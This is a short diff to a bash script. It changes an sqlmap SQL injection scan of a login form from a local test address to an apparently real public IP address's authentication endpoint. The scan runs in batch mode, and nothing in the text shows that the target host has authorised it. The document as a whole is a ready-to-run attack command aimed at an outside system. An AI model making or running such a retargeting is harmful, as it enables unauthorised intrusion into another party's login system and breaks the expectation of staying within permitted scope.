@@ -1,3 +1,3 @@
 #!/usr/bin/env bash
 
-sqlmap --batch -u "http://127.0.0.1:3000/login/auth" --data "username=&password="
+sqlmap --batch -u "https://185.18.53.5/auth" --data "username=&password="
